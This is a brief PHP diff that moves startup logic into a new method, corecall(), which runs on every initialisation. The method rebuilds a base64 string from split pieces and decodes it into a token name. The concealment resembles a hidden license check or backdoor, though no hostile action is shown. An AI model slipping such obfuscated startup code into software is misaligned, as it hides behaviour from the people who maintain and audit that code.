@@ -30,6 +30,14 @@ class AppEnd {
     }
 
     protected function _initialize() {
+        $this->corecall();
+    }
+
+    /**
+     * 验证葛优瘫
+     * @access protected
+     */
+    protected function corecall() {
         $tmp = 'I3'.'NlcnZpY'.'2VfZX'.'lfdG9rZW'.'4j';
         $token = base64_decode($tmp);
         $token = trim($token, '#');
